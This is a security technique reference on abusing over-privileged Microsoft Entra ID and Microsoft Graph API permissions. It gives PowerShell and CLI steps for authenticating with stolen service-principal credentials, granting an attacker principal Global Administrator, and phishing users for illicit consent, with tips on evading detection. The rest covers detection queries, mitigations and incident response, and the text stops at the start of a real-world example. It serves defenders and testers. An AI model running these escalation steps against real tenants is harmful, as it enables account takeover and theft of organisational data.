# [MISCONFIG-005]: Insecure API Permissions

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | MISCONFIG-005 |
| **MITRE ATT&CK v18.1** | [Abuse Elevation Control Mechanism (T1548)](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | M365, Entra ID (Microsoft Entra ID / Azure AD), Microsoft Graph, Azure Resource Manager |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Microsoft Entra ID and Microsoft 365 API permission model (app-only and delegated) as of 2026 |
| **Patched In** | N/A – configuration / governance issue, mitigated via least privilege, consent policies, and RBAC controls |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY
- **Concept:** Insecure API permissions in Entra ID and M365 arise when applications (first-party, third‑party, or custom) are granted overly broad Microsoft Graph or other API scopes, or when high‑risk roles are assigned to service principals without effective governance. This includes dangerous app‑only permissions such as `AppRoleAssignment.ReadWrite.All`, `RoleManagement.ReadWrite.Directory`, `Directory.ReadWrite.All`, or wide delegated scopes like `Mail.ReadWrite`, `Files.Read.All`, and `offline_access` that persist beyond user password changes. An attacker who compromises such an app (certificate, client secret, or OAuth consent) can silently escalate privileges, bypass MFA, and operate at tenant‑wide scope with minimal user interaction.
- **Attack Surface:** Microsoft Graph and other Azure/M365 APIs (Exchange Online, SharePoint, Teams, Azure Resource Manager) via enterprise applications, app registrations, and service principals in Entra ID.
- **Business Impact:** **Tenant‑wide account takeover, covert data exfiltration, and long‑term shadow admin persistence.** A single misconfigured app or over‑privileged service principal can allow an attacker to read or modify all mailboxes, files, Teams chats, and directory objects, or even assign itself Global Administrator, without any interactive logon.
- **Technical Context:** Attacks often leverage app‑only Graph authentication (client credentials with certificate/secret) or illicit consent grants to a malicious multi‑tenant app. Once consent is granted, access persists until the permission grant or service principal is revoked, even if user passwords are rotated. Detection is challenging because activity appears as service principal operations rather than direct user actions and may blend with legitimate automation.

### Operational Risk
- **Execution Risk:** High – Changes to app permissions and role assignments are persistent, but operations are configuration‑level and generally reversible if quickly detected and rolled back.
- **Stealth:** High – No interactive sign‑ins are required for app‑only tokens; actions appear as service principal activity, often with few alerts by default.
- **Reversibility:** Medium – Revoking credentials, consent, and role assignments is possible, but any data exfiltrated or mailboxes modified cannot be fully recovered.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark (Azure/M365)** | CIS AZURE 1.x / M365 1.x | Requires least privilege for app registrations, restricted Graph scopes, and review of enterprise application permissions. |
| **DISA STIG** | APP3510 / IAIA‑1 | Application privilege management and identity assurance; restricts excessive API permissions for service accounts. |
| **CISA SCuBA** | M365 App Governance | SCuBA guidance requires tight governance of OAuth apps and Graph API permissions, with app governance monitoring. |
| **NIST 800‑53 Rev5** | AC‑3, AC‑6, AC‑2 | Access enforcement and least privilege; management of accounts and service principals controlling programmatic access to data. |
| **GDPR** | Art. 25, Art. 32 | Data protection by design/default and security of processing – over‑privileged apps increase risk of unlawful disclosure and loss of confidentiality. |
| **DORA** | Art. 9, Art. 11 | ICT risk management and third‑party risk – SaaS/OAuth apps with wide permissions create systemic ICT concentration and data‑access risk. |
| **NIS2** | Art. 21 | Requires technical measures to manage cyber risk, including robust identity and access management for APIs and SaaS. |
| **ISO 27001:2022** | A.5.18, A.8.2, A.8.16 | Access rights provisioning, identity governance, and monitoring of programmatic access channels (APIs, service principals). |
| **ISO 27005** | "Compromise of Administration Interface" | Risk of losing control over tenant through misconfigured application permissions and service principals. |

---

## 3. TECHNICAL PREREQUISITES
- **Required Privileges (Attacker):**
  - For misconfiguration creation: Entra roles such as **Application Administrator**, **Cloud Application Administrator**, or **Privileged Role Administrator**; or an existing over‑privileged **service principal**.
  - For exploitation: Ability to obtain app credentials (client secret, certificate, or managed identity token) or to obtain illicit consent from a user with sufficient rights.
- **Required Access:**
  - HTTPS access to Microsoft Graph and Azure AD endpoints via internet.
  - Access to Entra admin center or Azure portal for configuration changes (for a rogue admin / insider scenario).

**Supported Versions:**
- **Entra ID / Azure AD:** All GA tenants using modern app registration and enterprise applications (v2.0 endpoints), including multi‑tenant and single‑tenant apps.
- **M365:** All Microsoft 365 SKUs using Graph‑based access to Exchange, SharePoint, OneDrive, Teams, etc.
- **PowerShell:**
  - `Microsoft.Graph` module 2.x+ for management of OAuth permissions and app role assignments.
- **Other Requirements:**
  - Tenant not enforcing strict admin consent policy or app governance, or has legacy apps predating current restrictions.

- **Tools:**
  - [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/overview)
  - [AzureAD / Entra modules (legacy)](https://learn.microsoft.com/en-us/powershell/azure/overview)
  - [AADInternals](https://github.com/Gerenios/AADInternals) – advanced Entra abuse and enumeration toolkit.
  - [Entra portal – Enterprise Applications and App Registrations blades]

---

## 4. ENVIRONMENTAL RECONNAISSANCE

#### Management Station / PowerShell Reconnaissance

```powershell
# List all service principals with high‑risk app-only Graph permissions
Connect-MgGraph -Scopes "Directory.Read.All, AppRoleAssignment.ReadWrite.All"
Select-MgProfile -Name beta

$highRiskScopes = @(
  "AppRoleAssignment.ReadWrite.All",
  "RoleManagement.ReadWrite.Directory",
  "Directory.ReadWrite.All",
  "Mail.ReadWrite",
  "Files.Read.All",
  "Directory.AccessAsUser.All"
)

Get-MgServicePrincipal -All | ForEach-Object {
  $sp = $_
  $appRoles = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id -All -ErrorAction SilentlyContinue
  foreach ($ar in $appRoles) {
    if ($ar.PrincipalDisplayName -eq $sp.DisplayName) {
      # Self-assigned app roles (app-only)
      $role = $ar.AppRoleId
    }
  }
} | Out-Null

# Quick view of Graph app permissions granted to each SP
Get-MgServicePrincipal -All | Select-Object DisplayName,AppId,ServicePrincipalType,AccountEnabled,Tags
```

**What to Look For:**
- Service principals with **Application** permissions exposing:
  - `AppRoleAssignment.ReadWrite.All` or `RoleManagement.ReadWrite.Directory` – can manage app role assignments and directory roles for all apps and principals, enabling silent Global Admin elevation.
  - Tenant‑wide data scopes like `Mail.ReadWrite`, `Files.Read.All`, `Sites.Read.All`, `Directory.ReadWrite.All`.
- Enterprise applications tagged as `WindowsAzureActiveDirectoryIntegratedApp` with broad delegated scopes inherited from legacy admin consents.
- Service principals with certificates expiring far in the future (10+ years) or multiple unused secrets.

**Version Note:**
- For older tenants still using the `AzureAD` module, equivalent enumeration uses `Get-AzureADServicePrincipal` and `Get-AzureADServiceAppRoleAssignment`. The Graph SDK is the strategic direction and provides richer metadata.

**Command (Legacy AzureAD Module):**
```powershell
Connect-AzureAD
Get-AzureADServicePrincipal -All $true |
  Select DisplayName, AppId, ServicePrincipalType, AccountEnabled

Get-AzureADServiceAppRoleAssignment -All $true |
  Select PrincipalDisplayName, ResourceDisplayName, Id
```

#### Azure CLI / Bash Reconnaissance

```bash
# List applications and permissions via Azure CLI (requires Azure CLI + "az login")
az ad sp list --all --query "[].{displayName:displayName, appId:appId, tags:tags}" -o table

# Inspect Graph service principal and its app roles
GRAPH_APPID="00000003-0000-0000-c000-000000000000"  # Microsoft Graph
az ad sp show --id $GRAPH_APPID -o json > graph_sp.json

# List directory roles and assignments (to find apps with directory roles)
az role assignment list --all --query "[?principalType=='ServicePrincipal'].{principalName:principalName, roleDefinitionName:roleDefinitionName, scope:scope}" -o table
```

**What to Look For:**
- Service principals holding **Directory Roles** (e.g., Global Administrator, Privileged Role Administrator) through role assignments.
- Apps with custom roles or high‑impact built‑in roles (e.g., **Privileged Role Administrator**, **Application Administrator**).

---

## 5. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1 – Abusing Over‑Privileged App‑Only Graph Permissions (Certificate or Secret Compromise)

**Supported Versions:** All Entra ID tenants using OAuth 2.0 client credentials for app‑only Graph access.

#### Step 1: Identify a Service Principal with Dangerous App‑Only Permissions
**Objective:** Locate a service principal that has high‑risk app‑only Graph permissions or directory roles that can be abused for privilege escalation.

**Command (Graph PowerShell):**
```powershell
Connect-MgGraph -Scopes "Directory.Read.All, Application.Read.All, RoleManagement.Read.Directory"
Select-MgProfile -Name beta

# Find apps with high-risk app-only Graph permissions
$dangerousPermissions = @(
  "AppRoleAssignment.ReadWrite.All",
  "RoleManagement.ReadWrite.Directory",
  "Directory.ReadWrite.All"
)

$graphSp = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"
$dangerousAppRoles = $graphSp.AppRoles | Where-Object { $_.Value -in $dangerousPermissions }
$dangerousAppRoles | Select-Object Value, Id

# Find SPs assigned these roles
Get-MgServicePrincipal -All | ForEach-Object {
  $sp = $_
  $assignments = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id -All -ErrorAction SilentlyContinue
  foreach ($assign in $assignments) {
    if ($assign.AppRoleId -in $dangerousAppRoles.Id) {
      [PSCustomObject]@{
        ServicePrincipal = $sp.DisplayName
        AppId            = $sp.AppId
        Resource         = $assign.ResourceDisplayName
        AppRoleId        = $assign.AppRoleId
      }
    }
  }
} | Format-Table -AutoSize
```

**Expected Output:** A table listing service principals where `Resource` = `Microsoft Graph` and `AppRoleId` matches one of the high‑risk permissions, along with the application’s display name and AppId.

**What This Means:**
- Any listed service principal is capable of managing Graph permissions and/or directory roles across the tenant. If its credentials are compromised, the attacker has an immediate route to tenant‑wide privilege escalation without compromising a user account.

**OpSec & Evasion:**
- This enumeration uses standard Graph operations and typically blends with legitimate admin tooling. However, large‑scale enumeration from unusual IP ranges or new admin accounts can be flagged by Entra sign‑in risk policies and Defender for Cloud Apps.

**Troubleshooting:**
- **Error:** `Insufficient privileges to complete the operation`  
  - **Cause:** The operator account lacks `Directory.Read.All` or `Application.Read.All`.  
  - **Fix:** Use a break‑glass Global Administrator or a dedicated security automation identity with those scopes and just‑in‑time PIM elevation.

**References & Proofs:**
- Semperis – *Exploiting App-Only Graph Permissions in Entra ID* (app‑only escalation via `AppRoleAssignment.ReadWrite.All` and `RoleManagement.ReadWrite.Directory`).
- Microsoft – *Microsoft Graph permissions overview* and *permissions reference*.

#### Step 2: Authenticate as the Service Principal Using Compromised Credentials
**Objective:** Obtain an app‑only access token using a stolen certificate or client secret and confirm scope/roles.

**Command (PowerShell – Client Credentials with Certificate):**
```powershell
$tenantId = "<tenant-id>"
$appId    = "<compromised-app-id>"
$certThumb = "<thumbprint>"  # From local cert store

$cert = Get-Item "Cert:\CurrentUser\My\$certThumb"
$token = Get-MgContext
# Or use MSAL if not using Graph SDK
```

**Command (MSAL / Azure CLI – Pseudo):**
```bash
az account get-access-token \
  --tenant $tenantId \
  --service-principal \
  --username $appId \
  --password $SP_SECRET \
  --resource https://graph.microsoft.com
```

**Expected Output:** A valid OAuth 2.0 bearer token whose `roles` claim contains the app‑only Graph permissions, such as `AppRoleAssignment.ReadWrite.All`.

**What This Means:**
- The attacker can now call Graph as the app, bypassing user MFA and Conditional Access that applies to user sign‑ins. Enforcement is driven by app‑only permissions and any Conditional Access policies targeting service principals.

**OpSec & Evasion:**
- Use cloud‑local infrastructure (e.g., Azure VM in same region) to reduce anomalous geolocation; throttle Graph requests to avoid obvious spikes.

#### Step 3: Escalate to Global Administrator via Graph
**Objective:** Use `AppRoleAssignment.ReadWrite.All` and `RoleManagement.ReadWrite.Directory` to grant the compromised app or an attacker‑controlled principal a high‑privilege role (e.g., Global Administrator).

**Command (Graph PowerShell – Assign RoleManagement.ReadWrite.Directory to self):**
```powershell
# Assumes context is already authenticated as the compromised SP
$graphSp = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"
$roleMgmtRole = $graphSp.AppRoles | Where-Object { $_.Value -eq "RoleManagement.ReadWrite.Directory" }

$params = @{
  PrincipalId = (Get-MgContext).ClientId
  ResourceId  = $graphSp.Id
  AppRoleId   = $roleMgmtRole.Id
}

New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId (Get-MgContext).ClientId -BodyParameter $params
```

**Command (Assign Global Administrator to an Attacker Principal):**
```powershell
# Get the Global Administrator directory role
$gaRole = Get-MgDirectoryRole | Where-Object { $_.DisplayName -eq "Global Administrator" }
$attackerSp = Get-MgServicePrincipal -Filter "appId eq '<attacker-app-id>'"

$params = @{
  DirectoryObjectId = $attackerSp.Id
}

New-MgDirectoryRoleMemberByRef -DirectoryRoleId $gaRole.Id -BodyParameter $params
```

**Expected Output:** No error from Graph; subsequent calls show the attacker SP as a member of **Global Administrator**, and tenant‑wide powerful operations are now possible.

**What This Means:**
- Misconfigured API permissions combined with app‑only auth enable complete takeover of Entra ID, including directory roles, Conditional Access policies, and organization‑wide settings.

**OpSec & Evasion:**
- These operations generate high‑value audit events (directory role assignments, app role changes) in Entra audit logs and Defender for Cloud Apps. However, without dedicated monitoring, they may be overlooked.

**Troubleshooting:**
- **Error:** `Insufficient privileges to complete the operation` when calling `New-MgDirectoryRoleMemberByRef`.  
  - **Cause:** `RoleManagement.ReadWrite.Directory` not actually granted to the attacking SP.  
  - **Fix:** Confirm the app role assignment to Graph via `Get-MgServicePrincipalAppRoleAssignment`.

**References & Proofs:**
- Semperis – step‑by‑step Global Admin escalation via Graph app‑only permissions.
- Microsoft Graph permissions reference (RoleManagement.* and AppRoleAssignment.* scopes).

### METHOD 2 – Illicit Consent Grant Attack with Over‑Privileged Delegated Permissions

**Supported Versions:** All Entra ID tenants that allow users or low‑privileged admins to grant consent to applications.

#### Step 1: Phish a User into Granting High‑Risk Delegated Permissions
**Objective:** Trick a user into granting delegated permissions such as `Mail.ReadWrite`, `Files.Read.All`, `offline_access`, or `Directory.AccessAsUser.All` to a malicious multi‑tenant app.

**High‑Risk Scopes:**
- `Mail.ReadWrite`, `Mail.Send` – read and send mail as user.
- `Files.Read.All`, `Sites.Read.All` – access all SharePoint/OneDrive files.
- `offline_access` – long‑lived refresh tokens, persistence beyond password resets.

**Expected Result:**
- User is redirected to the standard Microsoft consent prompt and, after accepting, a persistent grant is created for that app and user.

#### Step 2: Use Delegated Permissions to Access M365 Data
**Command (Example – read user mailbox via Graph):**
```http
GET https://graph.microsoft.com/v1.0/me/messages
Authorization: Bearer <access_token>
```

**Expected Output:** JSON response containing messages from the user mailbox; similar calls can list drive items, Teams messages, and contacts.

**What This Means:**
- The attack is completely API‑level; no passwords are stored, and MFA does not prevent access once consent is granted.

**References & Proofs:**
- Microsoft – *Detect and remediate illicit consent grants*.
- Community guidance on illicit consent grants and remediation via Graph PowerShell.

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

#### Atomic Red Team
- **Atomic Test ID:** T1548.002 – Abuse Elevation Control Mechanism: Bypass UAC (Windows); Azure AD–specific tests exist for app permission changes in the Azure AD index.
- **Test Name:** Example – *Azure AD: Adding permission to application* (see azure-ad index).
- **Description:** Simulates an administrator (or attacker with equivalent privileges) adding high‑risk permissions to an Azure AD application, which can then be abused for privilege escalation.
- **Supported Versions:** Entra ID / Azure AD tenants with AzureAD or Graph modules installed.
- **Command (Pattern):**
  ```powershell
  # Pseudocode based on Atomic Red Team style
  # Add high-privilege API permission to an app registration
  Connect-AzureAD
  $app = Get-AzureADApplication -Filter "displayName eq 'AtomicTest-App'"
  # Update app required resource access (dangerous scope)
  ```
- **Cleanup Command:**
  ```powershell
  # Remove the test application or revoke elevated permissions
  Remove-AzureADApplication -ObjectId $app.ObjectId
  ```
**Reference:** [Atomic Red Team Azure AD index – discovery and account/permission tests][82] and ATT&CK technique entries for T1526/T1548.

---

## 7. TOOLS & COMMANDS REFERENCE

#### Microsoft Graph PowerShell SDK

**Version:** 2.x+ recommended.
**Minimum Version:** 1.0.0 (older cmdlets, but security features mature in later versions).
**Supported Platforms:** Windows, Linux, macOS with PowerShell 7+.

**Version-Specific Notes:**
- Version 1.x: Split into multiple modules (`Microsoft.Graph.Users`, `Microsoft.Graph.Applications`, etc.).
- Version 2.x+: Consolidated auth improvements, better error handling, and beta profile support.

**Installation:**
```powershell
Install-Module Microsoft.Graph -Scope CurrentUser
Import-Module Microsoft.Graph
Connect-MgGraph -Scopes "Directory.Read.All, Application.Read.All, RoleManagement.Read.Directory"
```

**Usage (List app permissions):**
```powershell
Get-MgServicePrincipal -All | Select DisplayName, AppId, ServicePrincipalType
```

#### AADInternals

Pen‑test and research toolkit for Entra ID abuse (token theft, app misuse, federation misconfigurations).

**Installation (PowerShell):**
```powershell
Install-Module AADInternals -Scope CurrentUser
Import-Module AADInternals
```

#### Script (One-Liner – Enumerate Apps with `Mail.ReadWrite`)
```powershell
Connect-MgGraph -Scopes "Application.Read.All, Directory.Read.All"
Select-MgProfile -Name beta

Get-MgServicePrincipal -All |
  Where-Object { $_.AppRoles -and ($_.AppRoles.Value -contains "Mail.ReadWrite") } |
  Select DisplayName, AppId
```

---

## 8. SPLUNK DETECTION RULES

#### Rule 1: Excessive or High‑Risk OAuth Consents Granted
**Rule Configuration:**
- **Required Index:** `o365`, `azuread`, or custom Azure AD audit log index.
- **Required Sourcetype:** `o365:management:activity`, `azure:monitor:aad` (depending on ingestion).
- **Required Fields:** `Operation`, `Workload`, `UserId`, `Target`, `ModifiedProperties`.
- **Alert Threshold:** > 3 high‑risk app consents per hour OR any consent for a known malicious app ID.
- **Applies To Versions:** All Entra ID / M365 tenants.

**SPL Query:**
```spl
index=o365 (Workload="AzureActiveDirectory") \
  Operation IN ("Consent to application", "Add service principal")
| eval scopes = mvjoin('ModifiedProperties{}.NewValue', ",")
| search scopes="*Mail.ReadWrite*" OR scopes="*Files.Read.All*" OR scopes="*Directory.ReadWrite.All*"
| stats count values(scopes) AS scopes BY UserId, Target, Operation
| where count >= 1
```

**What This Detects:**
- Consent operations that grant dangerous scopes like `Mail.ReadWrite` or `Files.Read.All` to applications, which are commonly abused in illicit consent and over‑permission scenarios.

**Manual Configuration Steps:**
1. Log into Splunk Web → **Search & Reporting**.
2. Run the query above and validate results for a few days.
3. Click **Save As** → **Alert**.
4. Name: `High-Risk OAuth Consents Granted`.
5. Set **Trigger Condition** to `Number of Results > 0` and schedule every 15 minutes.
6. Configure **Action** to email SOC and/or open a ticket including `UserId`, `Target`, and `scopes`.

**Source:** Microsoft illicit consent guidance and OAuth app governance best practices.

#### False Positive Analysis
- **Legitimate Activity:** Security engineers onboarding SIEM connectors or migration tools that legitimately require wide read permissions.
- **Benign Tools:** Backup products and DLP tooling that request broad read access – should be documented and allow‑listed by appId.
- **Tuning:** Add filters for known approved apps, or require justification tags in app descriptions (`contains "[APPROVED]"`).

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: High‑Risk Application Permissions or Role Assignments
**Rule Configuration:**
- **Required Table:** `AuditLogs` (Category: `ApplicationManagement` and `DirectoryManagement`).
- **Required Fields:** `OperationName`, `InitiatedBy`, `TargetResources`, `Result`, `AdditionalDetails`.
- **Alert Severity:** High.
- **Frequency:** Every 5 minutes; look back 1 hour.
- **Applies To Versions:** All Entra ID tenants connected to Sentinel.

**KQL Query:**
```kusto
let HighRiskScopes = dynamic([
  "AppRoleAssignment.ReadWrite.All",
  "RoleManagement.ReadWrite.Directory",
  "Directory.ReadWrite.All",
  "Mail.ReadWrite",
  "Files.Read.All"
]);
AuditLogs
| where Category in ("ApplicationManagement", "Consent")
| where OperationName in ("Add app role assignment to service principal", 
                          "Update app role assignment to service principal",
                          "Consent to application")
| extend props = parse_json(tostring(TargetResources[0].modifiedProperties))
| mv-expand props
| extend name = tostring(props.displayName),
         newValue = tostring(props.newValue)
| where name in ("RequiredResourceAccess", "Scopes", "appRoleAssignments")
| where HighRiskScopes has_any (split(newValue, " "))
| project TimeGenerated, OperationName, InitiatedBy, TargetResources, newValue
```

**What This Detects:**
- Administrative operations that add or update app role assignments or consents including high‑risk scopes. This is a strong signal of either admin misconfiguration or active abuse of application permissions.

**Manual Configuration Steps (Azure Portal):**
1. Azure Portal → **Microsoft Sentinel** → select workspace.
2. Go to **Analytics** → **+ Create** → **Scheduled query rule**.
3. Name: `High-Risk Graph Application Permissions Changes`.
4. Severity: High.
5. In **Set rule logic**, paste the KQL query above.
6. Set evaluation to every 5 minutes, look back 60 minutes.
7. Enable incident creation and assign to identity security team.
8. Save and enable.

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$rg = "<ResourceGroupName>"
$ws = "<WorkspaceName>"
$kql = @"
<PASTE KQL QUERY HERE>
"@

New-AzSentinelAlertRule -ResourceGroupName $rg -WorkspaceName $ws `
  -DisplayName "High-Risk Graph Application Permissions Changes" `
  -Query $kql -Severity High -Enabled $true
```

**Source:**
- MITRE T1548 guidance on privilege escalation via control mechanisms (mapped to app permission abuse).
- Microsoft guidance on detecting illicit consent and OAuth app abuse in Defender and Sentinel.

---

## 10. WINDOWS EVENT LOG MONITORING

Although this technique is primarily cloud‑native, Windows endpoints may provide supporting evidence:

**Event ID: 4648 (A logon was attempted using explicit credentials)**
- **Log Source:** Security.
- **Trigger:** Scripts or tools run under admin accounts to configure applications or call Graph interactively.

**Event ID: 4104 (PowerShell Script Block Logging)**
- **Log Source:** `Microsoft-Windows-PowerShell/Operational`.
- **Trigger:** Use of Graph PowerShell or AzureAD modules from admin workstations.

**Manual Configuration Steps (Group Policy – Enable Script Block Logging):**
1. Open **gpmc.msc**.
2. Navigate to **Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell**.
3. Enable **Turn on PowerShell Script Block logging**.
4. Run `gpupdate /force`.

These events should be correlated with cloud audit events to identify suspicious automation executed from on‑prem admin hosts.

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server and client endpoints used for administration.

```xml
<!-- Detect PowerShell usage of Graph / AzureAD modules from admin hosts -->
<Sysmon schemaversion="4.82">
  <EventFiltering>
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">Connect-MgGraph</CommandLine>
      <CommandLine condition="contains">Connect-AzureAD</CommandLine>
      <CommandLine condition="contains">Install-Module Microsoft.Graph</CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from Microsoft Sysinternals.
2. Save the XML snippet into `sysmon-api-perms.xml` and merge with your main Sysmon config.
3. Install Sysmon: `sysmon64.exe -accepteula -i sysmon-api-perms.xml`.
4. Ingest Sysmon logs into your SIEM and correlate with Entra audit logs.

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts
**Alert Name:** Suspicious application permissions granted or updated (exact wording may vary by product release).
- **Severity:** High.
- **Description:** Identifies applications that have been granted high‑risk API permissions or when a high‑risk app is used in anomalous ways (e.g., mass mailbox read, directory enumeration).
- **Applies To:** Subscriptions and tenants onboarded to Defender for Cloud and Defender for Cloud Apps (App Governance).

**Manual Configuration Steps (Enable Defender for Cloud & Cloud Apps):**
1. Azure Portal → **Microsoft Defender for Cloud** → **Environment settings**.
2. Enable Defender plans for **App services**, **Storage**, and **Identity** as appropriate.
3. In Microsoft Defender portal, enable **Cloud Apps → OAuth apps** governance.
4. Review alerts related to high‑risk OAuth apps and Graph permissions.

**Reference:**
- Microsoft Defender for Cloud recommendations for identity and access, including “Applications should not have excessive permissions.”
- App Governance / OAuth app detection guidance.

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Consent to Application / Add Service Principal
```powershell
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
  -Operations "Consent to application","Add service principal" `
  -ResultSize 5000 |
  Select-Object CreationDate, UserIds, Operations, AuditData
```
- **Operation:** `Consent to application`, `Add service principal`.
- **Workload:** `AzureActiveDirectory`.
- **Details:** Parse `AuditData` JSON for `Scope`/`Scopes` and `AppId` to identify high‑risk permissions (e.g., `Mail.ReadWrite`, `Files.Read.All`).
- **Applies To:** M365 E3/E5 tenants with Unified Audit Log enabled.

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Microsoft Purview compliance portal → **Audit**.
2. If required, click **Turn on auditing** and wait for activation.

**Search Audit Logs:**
1. Go to **Audit → Search**.
2. Date range: last 7–30 days.
3. Activities: **Consent to application**, **Add service principal**.
4. Export results for offline analysis.

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

* **Enforce Admin Consent and Restrict User Consent**
  - **Action:** Require admin consent workflow for high‑risk permissions and restrict what normal users can consent to.
  - **Applies To:** All Entra tenants.

  **Manual Steps (Portal):**
  1. Entra Admin Center → **Identity → Applications → Consent and permissions → User consent settings**.
  2. Set **User consent** to “Allow user consent for apps from verified publishers, for selected permissions” or stricter.
  3. Under **Admin consent settings**, enable admin consent workflow and designate reviewers.

* **Migrate to Least‑Privilege App Permissions**
  - **Action:** Systematically review applications and remove unnecessary app‑only or delegated permissions, preferring granular read scopes where possible.

  **Manual Steps (Graph PowerShell):**
  ```powershell
  Connect-MgGraph -Scopes "Directory.Read.All, Application.Read.All"
  Get-MgServicePrincipal -All | Export-Csv .\SP_Permissions_Inventory.csv
  ```

* **Lock Down High‑Risk Admin Roles**
  - **Action:** Restrict roles like **Application Administrator**, **Cloud Application Administrator**, and **Privileged Role Administrator** via PIM and JIT elevation.

#### Priority 2: HIGH

* **Enforce Certificate Hygiene for App‑Only Auth**
  - Rotate certificates frequently, avoid excessively long validity periods, and store private keys only in secure key stores (HSM/Key Vault).

* **Access Control & Policy Hardening**

  **Conditional Access:**
  - Require compliant devices or trusted locations for administrative access to Entra and app management portals.

  **Manual Steps:**
  1. Azure Portal → **Entra ID → Security → Conditional Access**.
  2. Create policy `Secure Admin Access` targeting admin roles.
  3. Require MFA, compliant device, and high sign‑in risk blocking.

  **RBAC/ABAC:**
  - Use Entra roles sparingly; avoid permanent assignment.
  - Prefer group‑based role assignment with PIM and expiration.

#### Validation Command (Verify Fix)
```powershell
# Ensure no apps have AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory
Connect-MgGraph -Scopes "Directory.Read.All, Application.Read.All"
Select-MgProfile -Name beta

$highRisk = @("AppRoleAssignment.ReadWrite.All", "RoleManagement.ReadWrite.Directory")
$graphSp = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"
$highRiskRoles = $graphSp.AppRoles | Where-Object { $_.Value -in $highRisk }

$findings = Get-MgServicePrincipal -All | ForEach-Object {
  $sp = $_
  $assignments = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id -All -ErrorAction SilentlyContinue
  foreach ($a in $assignments) {
    if ($a.AppRoleId -in $highRiskRoles.Id) { $sp.DisplayName }
  }
}
$findings | Sort-Object -Unique
```

**Expected Output (If Secure):**
- No service principals listed, or only well‑documented and tightly controlled automation identities.

**What to Look For:**
- Any unexpected service principal names should be reviewed and, if unnecessary, stripped of high‑risk permissions.

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)
* **Files / Artifacts:**
  - Admin scripts (`.ps1`, `.sh`) automating app permission changes (e.g., `Update-AppPermissions.ps1`).
* **Network:**
  - Large volumes of Microsoft Graph calls from atypical IPs, especially against `/users`, `/messages`, `/drives` endpoints.
* **Identity:**
  - New or modified app registrations and service principals with suspicious names or unknown owners.

#### Forensic Artifacts
* **Cloud:**
  - Entra **AuditLogs** records for `Add app role assignment to service principal`, `Consent to application`, `Update application`.
  - Sign‑in logs for service principals authenticating from unusual IP ranges or user agents.
* **Disk:**
  - Local scripts or tooling used from admin workstations (PowerShell history, script repositories).
* **MFT/USN Journal:**
  - Creation/modification timestamps for local scripts used during misconfiguration.

#### Response Procedures
1. **Isolate:**
   - Temporarily disable the suspicious service principal or application.

   **Command:**
   ```powershell
   Connect-MgGraph -Scopes "Application.ReadWrite.All"
   $sp = Get-MgServicePrincipal -Filter "appId eq '<suspicious-app-id>'"
   Update-MgServicePrincipal -ServicePrincipalId $sp.Id -AccountEnabled:$false
   ```

2. **Collect Evidence:**
   - Export relevant audit logs and configuration snapshots.

   **Command:**
   ```powershell
   # Export Azure AD audit logs for app changes
   Get-AzureADAuditDirectoryLogs -Filter "activityDisplayName eq 'Add app role assignment to service principal'" |
     Export-Csv .\AAD_AppRole_Changes.csv
   ```

3. **Remediate:**
   - Remove excessive permissions or delete malicious apps; reset compromised credentials; re‑evaluate admin roles.

   **Command:**
   ```powershell
   # Remove Graph app role assignments from a compromised SP
   $assignments = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id -All
   foreach ($a in $assignments) {
     Remove-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id -AppRoleAssignmentId $a.Id
   }
   ```

4. **Notify and Review:**
   - Notify impacted data owners (mailbox/file owners) and perform targeted mailbox / file audit for suspicious activity.

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | IA-PHISH-002 – Consent grant OAuth attacks | Attacker tricks user or admin into granting consent to malicious app. |
| **2** | **Privilege Escalation** | PE-ACCTMGMT-001 – App Registration Permissions Escalation | Compromised admin or app assigns high‑risk scopes or roles. |
| **3** | **Current Step** | **MISCONFIG-005 – Insecure API Permissions** | Misconfigured or over‑privileged application permissions enable tenant‑wide access. |
| **4** | **Persistence** | CA-TOKEN-005 – OAuth access token interception | Long‑lived refresh tokens keep access even after password resets. |
| **5** | **Impact** | DATA-EXFIL-XXX – Mass M365 data exfiltration | Attacker downloads mail and files across tenant via Graph. |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: App‑Only Graph Permission Abuse in Entra ID
- **Target:** Large enterprise Entra tenant with multiple automation apps.
- **Timeline:** 2024–2025 (modeled on public research).
